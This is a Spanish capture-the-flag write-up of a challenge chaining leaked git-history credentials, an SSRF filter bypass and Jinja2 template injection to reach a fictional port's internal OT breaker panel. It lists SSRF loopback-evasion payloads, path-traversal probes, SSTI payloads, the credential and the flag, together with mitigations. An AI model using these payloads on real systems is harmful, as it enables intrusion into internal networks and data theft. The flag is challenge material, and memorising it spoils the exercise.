# Panel del Puerto — PIR-15

## 1. Datos del reto

| Campo | Valor |
|-------|-------|
| **Nombre** | PIR-15. Alcanzar el segmento OT de señalización |
| **Categoría** | Web / SSRF / SSTI |
| **URL de acceso** | `https://puerto.locdynamics.com/` |
| **Puntos** | 20 pts (valor decreciente, mínimo 6) |
| **Formato de entrega** | `T4C{...}` |
| **Flag** | `T4C{ssrf_l00pb4ck_0t_d1syunt0r}` |

---

## 2. Contexto del reto

### 2.1. Enunciado

> "El panel de gestión logística de la Autoridad Portuaria es la única vía que queda hacia el segmento OT que controla la señalización del puerto. Tras el incidente del 14, el operador restringió el acceso al panel de disyuntores y lo retiró de la red de gestión.
>
> El panel exige una credencial de servicio. Es la misma que obtuvo ayer el adversario y está en el material del Reto 3.
>
> Misión: llegar a la interfaz interna de gestión de disyuntores y extraer la clave de conciliación."

---

## 3. Fase 1: Reconocimiento inicial

### 3.1. Acceso al panel

Se accedió a `https://puerto.locdynamics.com/` con las **credenciales de la plataforma de competición**.

### 3.2. Identificación del Reto 3

El material del **Reto 3 (Rastro del Ingeniero — PIR-03)** consistía en:

- `foro_portulogistics.html` — Perfil de `rbelmonte-dev` en el foro
- `git_example_perfil.html` — Perfil de git con el repo `mli-tracking-tools`
- `red_profesional.html` — Perfil profesional de Rubén Belmonte

En el foro, Rubén menciona:

> "Al final lo resolvimos con un script propio, lo tenéis en mi repo público `mli-tracking-tools`. Ojo que la parte de credenciales la tuve que **limpiar** luego, no copiéis el settings tal cual del primer commit."

**Pista clave:** las credenciales fueron eliminadas del último commit, pero **siguen en el historial de Git**.

---

## 4. Fase 2: Extracción de la credencial de servicio

### 4.1. Análisis del repositorio Git

Se descargó y clonó el bundle `mli-tracking-tools.bundle`:

    git clone mli-tracking-tools.bundle mli-tools
    cd mli-tools

Se inspeccionó el historial de commits y se localizó el commit `1801590` ("Configuración de entorno de producción", 3 nov 2025), que es donde Rubén subió las credenciales antes de "limpiarlas" en el commit `a83d187` del 6 de noviembre.

Se extrajo el contenido del fichero `config/settings.yaml` en su estado original:

    git show 1801590:config/settings.yaml

**Resultado:**

    almacen:
      bucket: mli-manifiestos-archivo
      region: eu-west-1
      access_key_id: AKIA5RJQ2LNVXW3PD7TG
      secret_access_key: Xk9v2TqLm4Rb8NwZ7cHy1PjD6sFgAe0UiVtQrOnB

    portal:
      base_url: https://seguimiento.mli-iberia.example
      usuario_servicio: svc-tracking

**Observaciones del análisis:**

- **Credenciales en el historial:** ese commit contiene un par de claves de acceso con aspecto de AWS (`AKIA...`) en texto plano. Aunque el ejercicio sea ficticio, en un caso real habría que tratarlas como comprometidas: revocarlas o rotarlas en IAM, porque borrar el archivo en un commit posterior no las elimina del historial.
- **Limpieza del historial:** si fuese un repo real, se podría reescribir con `git filter-repo` o BFG, pero la rotación de claves es lo primero.
- **Prevención:** mover los secretos a variables de entorno o a un gestor de secretos, dejar `config/settings.yaml` fuera del control de versiones (o usar una plantilla `settings.example.yaml`) y añadir un escáner como `gitleaks` o `trufflehog` en pre-commit/CI.
- **Formato:** el archivo usa saltos de línea CRLF (`\r\n`), algo a tener en cuenta si se parsea desde Linux.

### 4.2. Credencial de servicio obtenida

| Campo | Valor |
|-------|-------|
| **Usuario** | `svc-tracking` |
| **Credencial** | `Xk9v2TqLm4Rb8NwZ7cHy1PjD6sFgAe0UiVtQrOnB` |

---

## 5. Fase 3: Acceso al panel VTS

### 5.1. Login en el panel

Se accedió a `https://puerto.locdynamics.com/` e introdujo:

- **USUARIO:** `svc-tracking`
- **CREDENCIAL:** `Xk9v2TqLm4Rb8NwZ7cHy1PjD6sFgAe0UiVtQrOnB`

**Resultado:** **Login exitoso.** El panel VTS de Algeciras se abrió mostrando:

- Radar / ARPA
- Carta del Estrecho de Gibraltar
- Contactos AIS
- Meteorología
- Panel de **"Comprobación de endpoints"**

### 5.2. Identificación del SSRF

En la esquina inferior derecha apareció el panel:

    COMPROBACIÓN DE ENDPOINTS

    El servidor solicita la URL indicada. Útil para verificar integraciones
    con transitarios y proveedores.

    [ https://transitario.e ] [ Comprobar ]

Con tres endpoints listados:

| Endpoint | Etiqueta |
|----------|----------|
| `http://ot-disyuntores.interno:9090/` | solo local |
| `http://srtp-planificacion.interno:8060/api/grafo` | solo local |
| `https://transitario-delta.example/salud` | externo |

**Conclusión:** el panel hace peticiones HTTP en nombre del usuario → **SSRF (Server-Side Request Forgery)**.

### 5.3. Análisis del endpoint

En la pestaña **Herramientas** se encontró el formulario:

    <form method="get" action="/comprobar">
      <input class="inp" type="text" name="url" value="http://ot-disyuntores.interno:9090/conciliacion">
      <button class="btn btn-p">Comprobar</button>
    </form>

**Endpoint:** `GET /comprobar?url=<URL>`
**Parámetro:** `url`

---

## 6. Fase 4: Bypass del filtro SSRF

### 6.1. Pruebas iniciales

Se probaron múltiples URLs internas:

| URL | Resultado |
|-----|-----------|
| `http://ot-disyuntores.interno:9090/` | ConnectionError |
| `http://ot-disyuntores.interno/` | ConnectionError |
| `http://ot-disyuntores/` | ConnectionError |
| `http://10.30.7.44/` | ConnectTimeout |
| `http://10.30.7.44:9090/` | ConnectTimeout |
| `http://127.0.0.1:9090/` | **403 Forbidden** |
| `http://localhost:9090/` | **403 Forbidden** |

**Conclusión:** el filtro bloquea `localhost` y `127.0.0.1`, pero los hostnames `.interno` no resuelven.

### 6.2. Evasiones del filtro SSRF

Se probaron evasiones clásicas de filtros SSRF:

| Evasión | Resultado |
|---------|-----------|
| `http://0177.0.0.1:9090/` | **(sin error)** |
| `http://0x7f.0.0.1:9090/` | **(sin error)** |
| `http://2130706433:9090/` | **(sin error)** |
| `http://127.1:9090/` | **(sin error)** |
| `http://127.0.1:9090/` | **(sin error)** |
| `http://0:9090/` | **(sin error)** |
| `http://[::ffff:127.0.0.1]:9090/` | **(sin error)** |
| `http://127.0.0.1.nip.io:9090/` | **(sin error)** |
| `http://127.0.0.1.sslip.io:9090/` | **(sin error)** |
| `http://localtest.me:9090/` | **(sin error)** |
| `http://localhost.localdomain:9090/` | Bloqueado por política |
| `http://[::1]:9090/` | ConnectionError |

**Conclusión:** el filtro **solo bloquea la cadena literal `localhost`** y algunas IPs directas, pero las evasiones funcionan.

### 6.3. Acceso al panel de disyuntores

Con la evasión `http://0177.0.0.1:9090/`, el SSRF llegó al panel interno de disyuntores OT.

**Respuesta JSON:**

    {
      "_info": "Usa /generar-informe?plantilla=... para informes de diagnostico",
      "alertas": ["DJ-ALG-04 (Enlace baliza ES-TAR-04) figura ABIERTO sin OT asociada"],
      "aviso": "Interfaz interna. Accesible unicamente desde el propio servidor. No exponer en la red de gestion.",
      "disyuntores": [
        {"circuito":"C-ILV-A","corriente_a":118,"estado":"cerrado","id":"DJ-ALG-01","tension_v":400,"ult_revision":"2026-01-08","zona":"Muelle Isla Verde"},
        {"circuito":"C-BAL-N","corriente_a":42,"estado":"cerrado","id":"DJ-ALG-02","tension_v":230,"ult_revision":"2026-01-08","zona":"Baliza de entrada norte"},
        {"circuito":"C-SEÑ-D","corriente_a":87,"estado":"cerrado","id":"DJ-ALG-03","tension_v":230,"ult_revision":"2026-01-08","zona":"Señalización dársena"},
        {"circuito":"C-BAL-T","corriente_a":0,"estado":"ABIERTO","id":"DJ-ALG-04","tension_v":230,"ult_revision":"2025-11-14","zona":"Enlace baliza ES-TAR-04"},
        {"circuito":"C-GRU-A","corriente_a":340,"estado":"cerrado","id":"DJ-ALG-05","tension_v":400,"ult_revision":"2026-01-22","zona":"Terminal APM -- grúas pórtico"},
        {"circuito":"C-FAR-C","corriente_a":31,"estado":"cerrado","id":"DJ-ALG-06","tension_v":230,"ult_revision":"2026-01-08","zona":"Faro de punta Carnero"},
        {"circuito":"C-GNS-D","corriente_a":24,"estado":"cerrado","id":"DJ-ALG-07","tension_v":230,"ult_revision":"2025-12-03","zona":"Sistema GNSS diferencial"},
        {"circuito":"C-BAL-G","corriente_a":39,"estado":"cerrado","id":"DJ-ALG-08","tension_v":230,"ult_revision":"2026-01-08","zona":"Enlace baliza ES-GIB-01"},
        {"circuito":"C-BOY-3","corriente_a":18,"estado":"cerrado","id":"DJ-ALG-09","tension_v":230,"ult_revision":"2025-12-03","zona":"Boya de tormenta BT-003"},
        {"circuito":"C-FAR-T","corriente_a":63,"estado":"cerrado","id":"DJ-TAR-01","tension_v":230,"ult_revision":"2026-01-08","zona":"Faro de Tarifa (principal)"},
        {"circuito":"C-TSS-E","corriente_a":55,"estado":"cerrado","id":"DJ-TAR-02","tension_v":230,"ult_revision":"2025-12-03","zona":"Señalización TSS Estrecho"}
      ],
      "nota": "El disyuntor DJ-ALG-04 figura ABIERTO desde el 14FEB 03:19Z, sin orden de trabajo asociada. Corresponde al enlace con la baliza ES-TAR-04, que figura comprometida en el segmento OT.",
      "resumen": {"abiertos":1,"cerrados":10,"total":11},
      "segmento": "señalizacion-portuaria --- Algeciras / Tarifa",
      "servicio": "gestion-disyuntores-OT"
    }

**Pista clave del propio panel:**

> `"_info": "Usa /generar-informe?plantilla=... para informes de diagnostico"`

---

## 7. Fase 5: Explotación del SSTI

### 7.1. Pruebas iniciales en `/generar-informe`

Se probó el endpoint con distintas plantillas:

| Plantilla | Respuesta |
|-----------|-----------|
| `conciliacion` | `conciliacion` |
| `diagnostico` | `diagnostico` |
| `list` | `list` |
| `/etc/passwd` | `/etc/passwd` |
| `../etc/passwd` | `../etc/passwd` |

**Conclusión:** el endpoint refleja el valor de `plantilla` sin renderizar contenido. Comportamiento típico de **SSTI** o **reflexión**.

### 7.2. Confirmación del SSTI

Se probó con payloads de Jinja2:

| Payload | Respuesta |
|---------|-----------|
| `{{7*7}}` | **`49`** |
| `${7*7}` | `${7*7}` |
| `<%= 7*7 %>` | `<%= 7*7 %>` |

**SSTI confirmado.** El motor de plantillas es **Jinja2** (Flask) y evalúa expresiones matemáticas.

### 7.3. Explotación del SSTI para extraer la flag

Se probaron payloads que exponen la configuración de Flask:

| Payload | Resultado |
|---------|-----------|
| `{{config}}` | **FLAG: `T4C{ssrf_l00pb4ck_0t_d1syunt0r}`** |
| `{{self.__dict__}}` | **FLAG: `T4C{ssrf_l00pb4ck_0t_d1syunt0r}`** |
| `{{config.items()}}` | **FLAG: `T4C{ssrf_l00pb4ck_0t_d1syunt0r}`** |
| `{{7*7}}` | `49` |
| `{{self}}` | `<TemplateReference None>` |

**La flag estaba almacenada en la configuración de Flask** y se expuso al inyectar `{{config}}`.

---

## 8. Cadena de explotación completa

    1. Login en https://puerto.locdynamics.com/

    2. Material del Reto 3 (Rastro del Ingeniero)
       └─ git bundle mli-tracking-tools.bundle
          └─ git show 1801590:config/settings.yaml
             ├─ usuario_servicio: svc-tracking
             └─ secret_access_key: Xk9v2TqLm4Rb8NwZ7cHy1PjD6sFgAe0UiVtQrOnB

    3. Login en el panel con la credencial de servicio
       ├─ Usuario: svc-tracking
       └─ Credencial: Xk9v2TqLm4Rb8NwZ7cHy1PjD6sFgAe0UiVtQrOnB
       → Login exitoso

    4. Identificación del SSRF
       └─ GET /comprobar?url=<URL>

    5. Bypass del filtro SSRF
       └─ http://0177.0.0.1:9090/ (evasión de 127.0.0.1)
       → Acceso al panel interno de disyuntores OT

    6. Descubrimiento del SSTI
       └─ /generar-informe?plantilla={{7*7}} → 49

    7. Explotación del SSTI
       └─ /generar-informe?plantilla={{config}}
       → FLAG: T4C{ssrf_l00pb4ck_0t_d1syunt0r}

---

## 9. Vulnerabilidades explotadas

| # | Vulnerabilidad | Descripción | Impacto |
|---|----------------|-------------|---------|
| 1 | **Credenciales en historial Git** | El secreto de `svc-tracking` estaba en el commit `1801590` y no se eliminó del historial | Acceso no autorizado al panel |
| 2 | **SSRF (Server-Side Request Forgery)** | El endpoint `/comprobar` permite hacer peticiones HTTP arbitrarias | Acceso a la red interna OT |
| 3 | **Bypass de filtro SSRF** | El filtro solo bloquea `localhost` y `127.0.0.1` literales | Evasión con `0177.0.0.1`, `2130706433`, etc. |
| 4 | **SSTI (Server-Side Template Injection)** | El endpoint `/generar-informe` evalúa plantillas Jinja2 sin sanitizar | Ejecución de código en el servidor / lectura de config |

---

## 10. Mitigaciones recomendadas

### 10.1. Prevención de fugas en Git

- **Rotar credenciales** inmediatamente si se filtran.
- **Reescribir el historial** con `git filter-repo` o BFG.
- **Usar variables de entorno** o gestores de secretos (Vault, AWS Secrets Manager).
- **Añadir escáneres** como `gitleaks` o `trufflehog` en pre-commit y CI.

### 10.2. Prevención de SSRF

- **Lista blanca** de dominios/IPs permitidos.
- **Validación estricta** de URLs (esquema, host, puerto).
- **Bloquear rangos privados** (RFC 1918, loopback, link-local).
- **Resolver DNS** antes de validar y **no seguir redirecciones**.
- **Usar un proxy dedicado** con políticas de salida.

### 10.3. Prevención de SSTI

- **Nunca** pasar input del usuario directamente a `render_template_string`.
- **Usar plantillas predefinidas** con parámetros separados.
- **Sandbox de Jinja2** (`SandboxedEnvironment`) si es imprescindible.
- **Validación de entrada** con listas blancas.

---

## 11. Lecciones aprendidas

1. **El historial de Git es público y permanente.** Eliminar un secreto del último commit no lo elimina del historial.
2. **Los filtros SSRF basados en listas negras son incompletos.** Bloquear `localhost` no sirve si se permiten evasiones como `0177.0.0.1` o `2130706433`.
3. **El propio panel da pistas.** El JSON de respuesta mencionaba `/generar-informe?plantilla=...`, que resultó ser el vector del SSTI.
4. **SSTI en Jinja2 es crítico.** `{{7*7}}` → `49` es la prueba rápida; `{{config}}` expone toda la configuración de Flask.
5. **La flag estaba en la config de Flask.** Al inyectar `{{config}}`, se expuso directamente.
6. **Encadenar vulnerabilidades.** La credencial filtrada + SSRF + SSTI permitieron llegar a la flag.

---

## 12. Flag final

    T4C{ssrf_l00pb4ck_0t_d1syunt0r}

**Reto PIR-15 completado.**
